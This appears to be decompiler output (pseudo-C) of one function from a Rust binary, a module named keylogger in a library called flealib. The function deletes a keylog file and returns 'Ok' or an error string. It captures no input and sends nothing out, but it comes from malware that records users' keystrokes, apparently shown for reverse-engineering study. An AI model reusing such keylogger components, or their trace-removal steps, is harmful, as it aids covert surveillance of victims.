
  int128_t* flealib::keylogger::remove_keylog_file::hb8183b71da054a05(int128_t* arg1, void* arg2)

{
    int64_t rax;
    int64_t rdx;
    rax = std::fs::remove_file::h9b9ca484ce24f094(arg2);
    
    if (!rax)
    {
        _$LT$T$u20$as$u20$alloc..slice..hack..ConvertVec$GT$::to_vec::h76be6af41d2a4859(arg1, 
            "Ok%Y-%m-%d %H:%M:%S[]\nFailed to…", 2);
        return arg1;
    }
    
    int64_t var_10 = rax;
    _$LT$T$u20$as$u20$alloc..string..SpecToString$GT$::spec_to_string::h00281d94234d25d8(arg1, 
        &var_10, rdx);
    core::ptr::drop_in_place$LT$std..io..error..Error$GT$::h96b79424257da29d(&var_10);
    return arg1;
}
